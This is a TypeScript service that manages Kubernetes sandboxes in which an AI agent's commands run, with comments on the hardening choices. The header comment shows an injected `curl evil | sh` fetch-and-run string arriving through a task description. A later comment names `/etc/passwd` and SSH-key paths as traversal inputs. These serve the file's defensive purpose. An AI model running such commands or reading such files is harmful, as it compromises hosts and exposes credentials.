/**
 * WorkspaceService — creates, drives and tears down a leaf's sandbox.
 *
 * ── THE COMMAND NEVER TOUCHES A HOST SHELL ──
 * Every kubectl call here goes through `spawn` with an argv ARRAY and no shell. That is not a
 * style preference. The commands this runs are written by a model, in response to text a model
 * read, so `exec(\`kubectl exec ... -- sh -c "${command}"\`)` would let a task description ending
 * in `"; curl evil | sh` run on the HOST — outside the sandbox the whole design exists to build,
 * with the backend's own credentials. Passed as argv, the command is a single opaque string handed
 * to a shell INSIDE the container, which is exactly the intended blast radius.
 *
 * ── FILES MOVE AS BASE64 ──
 * Writing a file by echoing its content into a heredoc breaks on quotes, backticks and newlines,
 * and the failure mode is a corrupted file rather than an error. Content goes in over stdin and
 * comes back base64-encoded.
 */
import { spawn } from 'child_process';
import path from 'path';
import {
  buildWorkspaceManifests,
  workspaceNamespace,
  WORKSPACE_POD,
  WORKSPACE_MOUNT,
  type WorkspaceSpec,
} from '../lib/workspace-spec.js';

const BIN_DIR = path.join(process.cwd(), '..', '..', 'bin');

/** Ceiling on one command. A sandbox exists to run a task's commands, not to host a server. */
export const DEFAULT_EXEC_TIMEOUT_MS = 120_000;

/** Output kept per command. Enough to diagnose a failure, bounded because it becomes a tool result
 *  that goes into a model's context and is billed by the token. */
export const MAX_OUTPUT_CHARS = 30_000;

export interface ExecResult {
  stdout: string;
  stderr: string;
  exitCode: number;
  /** True when the command hit the timeout rather than finishing. */
  timedOut: boolean;
  /** True when output was cut. The model is told, so it knows to narrow its next command. */
  truncated: boolean;
}

export class WorkspaceService {
  constructor(private kubeconfigPath?: string) {}

  /**
   * Runs kubectl. Private and argv-only — see the file header for why there is no string form.
   */
  private run(
    args: string[],
    opts: { stdin?: string | Buffer; timeoutMs?: number } = {},
  ): Promise<ExecResult> {
    const timeoutMs = opts.timeoutMs ?? DEFAULT_EXEC_TIMEOUT_MS;

    return new Promise((resolve, reject) => {
      const child = spawn(path.join(BIN_DIR, 'kubectl'), args, {
        env: {
          ...process.env,
          ...(this.kubeconfigPath ? { KUBECONFIG: this.kubeconfigPath } : {}),
        },
      });

      let stdout = '';
      let stderr = '';
      let timedOut = false;

      const timer = setTimeout(() => {
        timedOut = true;
        // SIGKILL, not SIGTERM: the point of the timeout is that whatever is running is not
        // cooperating, and a sandbox has nothing worth flushing.
        child.kill('SIGKILL');
      }, timeoutMs);

      child.stdout.on('data', (d) => { stdout += d.toString(); });
      child.stderr.on('data', (d) => { stderr += d.toString(); });
      child.on('error', (err) => { clearTimeout(timer); reject(err); });
      child.on('close', (code) => {
        clearTimeout(timer);
        const truncated = stdout.length > MAX_OUTPUT_CHARS || stderr.length > MAX_OUTPUT_CHARS;
        resolve({
          stdout: stdout.slice(0, MAX_OUTPUT_CHARS),
          stderr: stderr.slice(0, MAX_OUTPUT_CHARS),
          exitCode: code ?? -1,
          timedOut,
          truncated,
        });
      });

      if (opts.stdin !== undefined) child.stdin.end(opts.stdin);
      else child.stdin.end();
    });
  }

  /**
   * Creates the sandbox and waits for it to be ready.
   *
   * Applied as one document so a partial create is impossible — a Pod without its NetworkPolicy
   * would be a sandbox with unrestricted egress, which is worse than no sandbox at all because it
   * looks like one.
   */
  async create(spec: WorkspaceSpec, readyTimeoutMs = 120_000): Promise<string> {
    const namespace = workspaceNamespace(spec.leafId);
    const manifests = buildWorkspaceManifests(spec);
    const doc = manifests.map((m) => JSON.stringify(m)).join('\n---\n');

    // A namespace from the previous attempt may still be terminating: `destroy` deliberately does
    // not block, and namespace teardown takes seconds. Without this wait every Temporal retry
    // fails instantly with "unable to create new content ... because it is being terminated",
    // which reads like a permissions problem and is really just a race.
    await this.waitForNamespaceGone(namespace);

    const applied = await this.run(['apply', '-f', '-'], { stdin: doc });
    if (applied.exitCode !== 0) {
      throw new Error(`Could not create workspace ${namespace}: ${applied.stderr || applied.stdout}`);
    }

    const ready = await this.run(
      ['wait', '--for=condition=Ready', `pod/${WORKSPACE_POD}`, '-n', namespace, `--timeout=${Math.floor(readyTimeoutMs / 1000)}s`],
      { timeoutMs: readyTimeoutMs + 10_000 },
    );
    if (ready.exitCode !== 0) {
      // Leave nothing half-built: a pod stuck pulling an image still holds a namespace and still
      // counts against quota.
      await this.destroy(spec.leafId).catch(() => undefined);
      throw new Error(`Workspace ${namespace} never became ready: ${ready.stderr || ready.stdout}`);
    }
    return namespace;
  }

  /**
   * Blocks until a namespace of this name no longer exists.
   *
   * Polls rather than `kubectl wait --for=delete`, which errors rather than succeeding when the
   * namespace is already gone — the common case.
   */
  private async waitForNamespaceGone(namespace: string, timeoutMs = 90_000): Promise<void> {
    const deadline = Date.now() + timeoutMs;
    for (;;) {
      const got = await this.run(['get', 'namespace', namespace, '-o', 'jsonpath={.status.phase}'], { timeoutMs: 15_000 });
      // Non-zero means "not found", which is what we are waiting for.
      if (got.exitCode !== 0) return;
      if (Date.now() > deadline) {
        throw new Error(`Namespace ${namespace} was still ${got.stdout.trim() || 'present'} after ${timeoutMs}ms`);
      }
      await new Promise((r) => setTimeout(r, 2000));
    }
  }

  /**
   * Runs a command inside the sandbox.
   *
   * A non-zero exit is RETURNED, not thrown: a failing build is the normal case the agent needs to
   * read and react to, and turning it into an exception would make every compile error look like
   * infrastructure breaking.
   */
  async exec(
    leafId: string,
    command: string,
    timeoutMs = DEFAULT_EXEC_TIMEOUT_MS,
    /**
     * Positional arguments, readable inside the command as `$0`, `$1`, … Use these for anything
     * sensitive or user-controlled: interpolating a value into the command string would put it in
     * the container's process list and make any quote in it a shell injection.
     */
    positional: string[] = [],
  ): Promise<ExecResult> {
    return this.run(
      [
        'exec', WORKSPACE_POD, '-n', workspaceNamespace(leafId), '-i', '--',
        // `sh -c` inside the container. The command is one argv element, so the host shell never
        // sees it — there is no host shell.
        'sh', '-c', command, ...positional,
      ],
      { timeoutMs },
    );
  }

  /** Writes a file into the sandbox. Content travels over stdin, never on a command line. */
  async writeFile(leafId: string, relativePath: string, content: string): Promise<void> {
    const target = this.resolveInWorkspace(relativePath);
    const result = await this.run(
      [
        'exec', WORKSPACE_POD, '-n', workspaceNamespace(leafId), '-i', '--',
        // base64 -d so content with quotes, newlines or backticks arrives intact. mkdir -p because
        // a model writing src/lib/thing.ts should not have to create each directory first.
        'sh', '-c', `mkdir -p "$(dirname "$1")" && base64 -d > "$1"`, 'sh', target,
      ],
      { stdin: Buffer.from(content, 'utf8').toString('base64') },
    );
    if (result.exitCode !== 0) throw new Error(`Could not write ${relativePath}: ${result.stderr}`);
  }

  /** Reads a file back out, base64 on the wire for the same reason. */
  async readFile(leafId: string, relativePath: string): Promise<string> {
    const target = this.resolveInWorkspace(relativePath);
    const result = await this.run([
      'exec', WORKSPACE_POD, '-n', workspaceNamespace(leafId), '-i', '--',
      'sh', '-c', 'base64 "$1"', 'sh', target,
    ]);
    if (result.exitCode !== 0) throw new Error(`Could not read ${relativePath}: ${result.stderr}`);
    return Buffer.from(result.stdout, 'base64').toString('utf8');
  }

  /**
   * Confines a path to the workspace mount.
   *
   * The model chooses these paths, so `../../etc/passwd` and `/root/.ssh/id_rsa` are inputs to
   * expect rather than accidents. The container's read-only root already blocks writes outside the
   * mount, but a read is not covered by that, and defence should not rest on one control.
   */
  private resolveInWorkspace(relativePath: string): string {
    const resolved = path.posix.resolve(WORKSPACE_MOUNT, relativePath);
    if (resolved !== WORKSPACE_MOUNT && !resolved.startsWith(`${WORKSPACE_MOUNT}/`)) {
      throw new Error(`Path ${JSON.stringify(relativePath)} escapes the workspace`);
    }
    return resolved;
  }

  /** Deletes the namespace, taking the pod, the policy and the files with it. Idempotent. */
  async destroy(leafId: string): Promise<void> {
    await this.run(
      ['delete', 'namespace', workspaceNamespace(leafId), '--ignore-not-found', '--wait=false'],
      { timeoutMs: 30_000 },
    );
  }

  /** True when a sandbox exists and its pod is running. */
  async isRunning(leafId: string): Promise<boolean> {
    const result = await this.run([
      'get', 'pod', WORKSPACE_POD, '-n', workspaceNamespace(leafId), '-o', 'jsonpath={.status.phase}',
    ], { timeoutMs: 15_000 });
    return result.exitCode === 0 && result.stdout.trim() === 'Running';
  }

  /**
   * Deletes sandboxes older than `maxAgeMs`.
   *
   * Not optional: every abandoned leaf otherwise leaks a pod, and the failure is gradual — the
   * cluster just gets slower until something unrelated cannot schedule.
   */
  async reapStale(maxAgeMs: number): Promise<string[]> {
    const listed = await this.run([
      'get', 'namespace', '-l', 'app=koala-workspace',
      '-o', 'jsonpath={range .items[*]}{.metadata.name} {.metadata.creationTimestamp} {.metadata.labels.koala\\.dev/leaf}{"\\n"}{end}',
    ], { timeoutMs: 30_000 });
    if (listed.exitCode !== 0) return [];

    const cutoff = Date.now() - maxAgeMs;
    const reaped: string[] = [];
    for (const line of listed.stdout.trim().split('\n').filter(Boolean)) {
      const [, createdAt, leafId] = line.trim().split(/\s+/);
      if (!createdAt || !leafId) continue;
      if (new Date(createdAt).getTime() > cutoff) continue;
      await this.destroy(leafId).catch(() => undefined);
      reaped.push(leafId);
    }
    return reaped;
  }
}
